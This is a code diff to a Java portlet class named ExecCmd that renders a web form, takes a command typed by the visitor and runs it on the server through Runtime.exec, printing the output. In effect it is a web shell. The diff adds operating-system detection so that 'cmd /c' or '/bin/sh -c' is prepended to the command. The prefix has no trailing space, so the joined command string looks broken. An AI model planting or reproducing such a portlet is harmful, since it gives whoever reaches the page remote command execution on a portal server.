@@ -24,7 +24,16 @@ public class ExecCmd extends GenericPortlet {
 	{
 		response.setContentType("text/html");
 		PrintWriter writer = response.getWriter();
-		writer.println("<p>Execute command</p>");
+
+		String cmdprefix;
+		String osname=System.getProperty("os.name");
+		if (osname.indexOf("Win") >= 0) {
+			cmdprefix="cmd /c";
+		} else {
+			cmdprefix="/bin/sh -c";
+		}
+
+		writer.println("<p>Execute command on "+osname+"</p>");
 		writer.println("<p><form action=\""+response.createActionURL()+"\" method=\"POST\">");
 		writer.println("<input name=\""+response.getNamespace()+"cmd\" />");
 		writer.println("<input name=\"submit\" type=\"submit\" value=\"Execute\" />");
@@ -35,6 +44,7 @@ public class ExecCmd extends GenericPortlet {
 		if (cmd == null) {
 			writer.println("<p>No command to execute</p>");
 		} else {
+			cmd = cmdprefix + cmd;
 			writer.println("<p>Executing: "+cmd+"</p>");
 			writer.println("<hr><pre>");
 			Process p = Runtime.getRuntime().exec(cmd);
